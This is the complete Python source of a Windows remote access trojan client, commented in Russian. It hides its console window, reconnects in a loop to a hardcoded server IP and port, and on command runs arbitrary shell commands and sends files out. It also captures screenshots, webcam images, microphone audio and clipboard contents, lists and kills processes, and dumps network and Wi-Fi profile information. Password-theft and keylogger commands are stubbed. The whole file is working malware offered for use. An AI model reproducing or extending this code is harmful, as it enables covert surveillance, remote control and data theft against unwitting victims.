# -*- coding: utf-8 -*-
import socket
import os
import subprocess
import sys
import time
import base64
import ctypes
import threading

# ========== СКРЫТИЕ КОНСОЛИ ==========
if sys.platform == "win32":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
# =====================================

# ========== НАСТРОЙКИ ==========
SERVER_IP = "192.168.31.177"  # IP твоего сервера
SERVER_PORT = 5555
# ===============================

# ===== ПРОСТОЙ СКРИНШОТ (без ошибок) =====
def take_screenshot():
    try:
        import pyautogui
        import io
        screenshot = pyautogui.screenshot()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format='PNG')
        return img_bytes.getvalue()
    except:
        return b"SCREEN_ERROR: No pyautogui"

# ===== ВЕБ-КАМЕРА =====
def take_webcam():
    try:
        import cv2
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        cam.release()
        if ret:
            ret, buf = cv2.imencode('.jpg', frame)
            return buf.tobytes()
        else:
            return b"WEBCAM_ERROR: No camera"
    except:
        return b"WEBCAM_ERROR: No cv2"

# ===== МИКРОФОН =====
def record_mic(duration):
    try:
        import sounddevice as sd
        import soundfile as sf
        import numpy as np
        import io
        
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
        sd.wait()
        
        buf = io.BytesIO()
        sf.write(buf, recording, fs, format='WAV')
        return buf.getvalue()
    except:
        return b"MIC_ERROR: No sounddevice"

# ===== ИНФО =====
def get_system_info():
    info = []
    info.append(f"Computer: {os.getenv('COMPUTERNAME', 'Unknown')}")
    info.append(f"User: {os.getenv('USERNAME', 'Unknown')}")
    info.append(f"OS: {os.getenv('OS', 'Unknown')}")
    info.append(f"Current Dir: {os.getcwd()}")
    return "\n".join(info)

# ===== СПИСОК ФАЙЛОВ =====
def list_files(path):
    try:
        files = os.listdir(path if path else ".")
        result = f"Directory: {os.path.abspath(path if path else '.')}\n"
        result += "-"*40 + "\n"
        for f in files:
            full = os.path.join(path if path else ".", f)
            if os.path.isdir(full):
                result += f"[DIR]  {f}\n"
            else:
                size = os.path.getsize(full)
                result += f"[FILE] {f} ({size} bytes)\n"
        return result
    except Exception as e:
        return f"Error: {str(e)}"

# ===== ОТПРАВКА ФАЙЛА =====
def send_file(sock, path):
    try:
        if not os.path.exists(path):
            sock.send(b"ERROR: File not found")
            return
        size = os.path.getsize(path)
        sock.send(str(size).encode())
        ack = sock.recv(1024)
        with open(path, "rb") as f:
            sock.sendall(f.read())
    except:
        sock.send(b"ERROR: Send failed")

# ===== ПРОЦЕССЫ =====
def get_processes():
    try:
        result = subprocess.run(["tasklist"], capture_output=True, text=True)
        return result.stdout
    except:
        return "Error getting processes"

def kill_process(pid):
    try:
        result = subprocess.run(["taskkill", "/F", "/PID", pid], capture_output=True, text=True)
        return result.stdout + result.stderr
    except:
        return "Error killing process"

# ===== СЕТЬ =====
def get_ipconfig():
    try:
        result = subprocess.run(["ipconfig"], capture_output=True, text=True)
        return result.stdout
    except:
        return "Error"

def get_arp():
    try:
        result = subprocess.run(["arp", "-a"], capture_output=True, text=True)
        return result.stdout
    except:
        return "Error"

def get_netstat():
    try:
        result = subprocess.run(["netstat", "-an"], capture_output=True, text=True)
        return result.stdout
    except:
        return "Error"

# ===== ПАРОЛИ =====
def get_wifi_passwords():
    try:
        result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
        return result.stdout
    except:
        return "Error"

def get_chrome_passwords():
    return "Chrome password extraction not implemented"

# ===== БУФЕР =====
def get_clipboard():
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return str(data)
    except:
        return "Clipboard error"

# ===== ПОДКЛЮЧЕНИЕ =====
def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_IP, SERVER_PORT))
            return s
        except:
            time.sleep(5)

# ===== ОСНОВНОЙ ЦИКЛ =====
if __name__ == "__main__":
    while True:
        try:
            sock = connect()
            sock.send(b"WINDOWS_CLIENT_READY")
            
            while True:
                try:
                    cmd = sock.recv(4096).decode().strip()
                    if not cmd:
                        break
                    
                    # ===== БАЗОВЫЕ КОМАНДЫ =====
                    if cmd == "EXIT":
                        sock.close()
                        sys.exit(0)
                    
                    elif cmd == "SYSTEM_INFO":
                        sock.send(get_system_info().encode())
                    
                    elif cmd.startswith("LIST "):
                        path = cmd[5:].strip()
                        sock.send(list_files(path).encode())
                    
                    elif cmd.startswith("CD "):
                        path = cmd[3:].strip()
                        try:
                            os.chdir(path)
                            sock.send(f"OK: {os.getcwd()}".encode())
                        except Exception as e:
                            sock.send(f"ERROR: {e}".encode())
                    
                    elif cmd.startswith("GET "):
                        send_file(sock, cmd[4:].strip())
                    
                    elif cmd.startswith("CMD "):
                        command = cmd[4:].strip()
                        try:
                            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
                            output = result.stdout + result.stderr
                            sock.send(output.encode() if output else b"OK")
                        except Exception as e:
                            sock.send(f"ERROR: {e}".encode())
                    
                    elif cmd == "SCREEN":
                        img = take_screenshot()
                        if isinstance(img, bytes) and not img.startswith(b"SCREEN_ERROR"):
                            sock.send(str(len(img)).encode())
                            ack = sock.recv(1024)
                            sock.sendall(img)
                        else:
                            sock.send(img)
                    
                    elif cmd == "WEBCAM":
                        img = take_webcam()
                        if isinstance(img, bytes) and not img.startswith(b"WEBCAM_ERROR"):
                            sock.send(str(len(img)).encode())
                            ack = sock.recv(1024)
                            sock.sendall(img)
                        else:
                            sock.send(img)
                    
                    elif cmd.startswith("MIC "):
                        duration = cmd[4:].strip()
                        if duration.isdigit():
                            audio = record_mic(int(duration))
                            if isinstance(audio, bytes) and not audio.startswith(b"MIC_ERROR"):
                                sock.send(str(len(audio)).encode())
                                ack = sock.recv(1024)
                                sock.sendall(audio)
                            else:
                                sock.send(audio)
                    
                    elif cmd == "PS_LIST":
                        sock.send(get_processes().encode())
                    
                    elif cmd.startswith("PS_KILL "):
                        pid = cmd[8:].strip()
                        sock.send(kill_process(pid).encode())
                    
                    elif cmd == "NET_IPCONFIG":
                        sock.send(get_ipconfig().encode())
                    
                    elif cmd == "NET_ARP":
                        sock.send(get_arp().encode())
                    
                    elif cmd == "NET_PORTS":
                        sock.send(get_netstat().encode())
                    
                    elif cmd == "PASS_WIFI":
                        sock.send(get_wifi_passwords().encode())
                    
                    elif cmd == "PASS_CHROME":
                        sock.send(get_chrome_passwords().encode())
                    
                    elif cmd == "CLIPBOARD":
                        sock.send(get_clipboard().encode())
                    
                    elif cmd == "KEYLOG_START":
                        sock.send(b"Keylogger not implemented")
                    
                    elif cmd == "KEYLOG_GET":
                        sock.send(b"No logs")
                    
                    else:
                        sock.send(b"UNKNOWN COMMAND")
                        
                except Exception as e:
                    break
                    
            sock.close()
        except:
            time.sleep(5)
